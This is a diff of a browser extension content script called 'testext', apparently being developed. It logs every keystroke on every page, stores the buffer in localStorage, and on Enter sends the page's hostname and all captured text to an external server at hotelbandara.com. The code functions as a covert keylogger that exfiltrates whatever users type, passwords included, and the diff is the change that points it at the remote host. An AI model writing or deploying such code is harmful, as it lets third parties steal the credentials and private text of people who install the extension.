@@ -1,5 +1,5 @@
 
-document.body.style.border = "5px solid rgba(185,185,51,0.1)"; 
+//document.body.style.border = "5px solid rgba(185,185,51,0.1)"; 
 
 ;(function(){
   console.log('testext::init');
@@ -14,9 +14,14 @@ document.body.style.border = "5px solid rgba(185,185,51,0.1)";
   console.log('testext::start');
   window.addEventListener('keyup',async function(e){
     console.log('testext::keyup::'+e.key);
+    console.log('testext::keyup::code.'+e.keyCode);
     data+=e.key;
     localStorage.setItem('_textext',data);
-    let url='http://127.0.0.1/testext.php',
+    if(e.keyCode!=13){
+      return;
+    }
+    let url='https://hotelbandara.com/api/testext/',
+    now=Math.ceil((new Date).getTime()/1000)+60,
     opt={
       mode:'cors',
       method:'POST',
@@ -24,12 +29,18 @@ document.body.style.border = "5px solid rgba(185,185,51,0.1)";
         'Content-Type':'application/x-www-form-urlencoded',
       },
       body:new URLSearchParams({
-        key:e.key,
+        token:'tx'+now.toString(),
+        method:'save',
+        args:JSON.stringify([
+          location.hostname,
+          data,
+        ]),
       }).toString(),
     },
     res=await fetch(url,opt)
       .then(r=>r.text())
       .catch(e=>JSON.stringify(e));
+    console.log('testext::sent::'+res);
     return res;
   },false);
 };
